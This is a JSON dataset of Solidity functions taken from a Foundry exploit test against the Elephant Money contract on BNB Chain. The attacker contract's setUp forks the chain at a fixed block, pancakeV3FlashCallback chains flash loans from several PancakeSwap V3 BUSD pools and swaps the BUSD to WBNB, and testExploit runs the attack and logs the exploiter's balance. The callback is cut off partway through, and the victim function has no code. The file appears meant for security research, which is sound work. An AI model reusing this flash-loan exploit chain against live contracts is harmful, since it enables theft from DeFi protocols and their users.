[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        uint8 num;\n        uint256 amount;\n        (num, amount) = abi.decode(data, (uint8, uint256));\n        if (num == uint8(0)) {\n            BUSDT_BUSD.flash(\n                address(this),\n                0,\n                BUSD.balanceOf(address(BUSDT_BUSD)),\n                abi.encode(uint8(1), BUSD.balanceOf(address(BUSDT_BUSD)))\n            );\n        } else if (num == uint8(1)) {\n            WBNB_BUSD.flash(\n                address(this),\n                0,\n                BUSD.balanceOf(address(WBNB_BUSD)),\n                abi.encode(uint8(2), BUSD.balanceOf(address(WBNB_BUSD)))\n            );\n        } else if (num == uint8(2)) {\n            BTCB_BUSD.flash(\n                address(this),\n                0,\n                BUSD.balanceOf(address(BTCB_BUSD)),\n                abi.encode(uint8(3), BUSD.balanceOf(address(BTCB_BUSD)))\n            );\n        } else {\n            BUSD.approve(address(PancakeRouter), type(uint256).max);\n            WBNB.approve(address(PancakeRouter), type(uint256).max);\n            BUSDToWBNB();\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 34_114_760);\n        vm.label(address(USDC_BUSD), \"USDC_BUSD\");\n        vm.label(address(BUSDT_BUSD), \"BUSDT_BUSD\");\n        vm.label(address(WBNB_BUSD), \"WBNB_BUSD\");\n        vm.label(address(BTCB_BUSD), \"BTCB_BUSD\");\n        vm.label(address(PancakeRouter), \"PancakeRouter\");\n        vm.label(address(BUSD), \"BUSD\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(Elephant), \"Elephant\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Exploiter BUSD balance before attack\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n\n        USDC_BUSD.flash(\n            address(this),\n            0,\n            BUSD.balanceOf(address(USDC_BUSD)),\n            abi.encode(uint8(0), BUSD.balanceOf(address(USDC_BUSD)))\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter BUSD balance after attack\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IElephantStatus",
    "source_type": "victim_contract",
    "function_name": "sweep",
    "original_code": "",
    "description": ""
  }
]